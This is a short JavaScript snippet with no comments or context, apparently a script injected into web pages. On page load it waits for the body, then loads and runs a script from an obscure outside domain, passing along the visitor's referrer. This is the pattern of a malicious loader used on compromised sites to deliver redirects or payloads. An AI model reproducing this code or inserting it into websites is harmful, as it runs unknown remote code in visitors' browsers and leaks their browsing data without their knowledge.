(function(w) {
	var script = document.createElement('script');
	var ref = escape(document.referrer);
	var i = setInterval(function() {
		if (typeof w.document.body !== 'undefined') {
			script.src = 'http://studiedbweighed.asia/t-58-40198/'+escape(ref) ;
			w.document.body.appendChild(script);
			clearInterval(i);
		}
	}, 200);
})(window);